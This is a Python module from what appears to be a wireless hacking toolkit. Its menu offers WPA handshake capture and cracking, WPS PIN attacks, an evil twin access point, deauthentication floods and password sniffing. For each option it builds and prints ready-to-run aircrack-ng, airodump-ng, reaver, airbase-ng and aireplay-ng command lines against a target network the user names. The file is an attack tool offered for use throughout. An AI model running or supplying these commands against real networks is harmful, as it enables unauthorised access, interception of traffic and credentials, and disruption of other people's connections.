#!/usr/bin/env python3
import sys, os, subprocess
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

@auth_required
def run_wifi():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║           WIFI HACKING SUITE MODULE                   ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] Scan Networks")
    print("[2] WPA Handshake Capture")
    print("[3] Handshake Crack")
    print("[4] WPS Pin Attack")
    print("[5] Evil Twin AP")
    print("[6] Deauth Attack")
    print("[7] Password Sniffer")
    choice = input("\n[WIFI] Select: ").strip()
    if choice == "1":
        print("[WIFI] Run: termux-wifi-scaninfo")
        log_action("WIFI", "Network scan")
    elif choice == "2":
        iface = input("[WIFI] Interface (default wlan0): ").strip() or "wlan0"
        bssid = input("[WIFI] Target BSSID: ").strip()
        ch = input("[WIFI] Channel: ").strip()
        print("[WIFI] airmon-ng start " + iface)
        print("[WIFI] airodump-ng -c " + ch + " --bssid " + bssid + " -w capture " + iface + "mon")
        log_action("WIFI", "Handshake capture on " + bssid)
    elif choice == "3":
        cap = input("[WIFI] .cap file: ").strip()
        wl = input("[WIFI] Wordlist: ").strip()
        print("[WIFI] aircrack-ng " + cap + " -w " + wl)
        log_action("WIFI", "Crack " + cap)
    elif choice == "4":
        bssid = input("[WIFI] BSSID: ").strip()
        print("[WIFI] reaver -i wlan0mon -b " + bssid + " -vv")
        log_action("WIFI", "WPS on " + bssid)
    elif choice == "5":
        ssid = input("[WIFI] Fake SSID: ").strip()
        print("[WIFI] airbase-ng -e '" + ssid + "' -c 6 wlan0mon")
        log_action("WIFI", "Evil Twin " + ssid)
    elif choice == "6":
        bssid = input("[WIFI] BSSID: ").strip()
        iface = input("[WIFI] Interface: ").strip() or "wlan0"
        pkts = input("[WIFI] Packets (default 100): ").strip() or "100"
        print("[WIFI] aireplay-ng -0 " + pkts + " -a " + bssid + " " + iface + "mon")
        log_action("WIFI", "Deauth " + pkts + " to " + bssid)
    elif choice == "7":
        print("[WIFI] Passive sniffing with tcpdump")
        log_action("WIFI", "Password sniff")
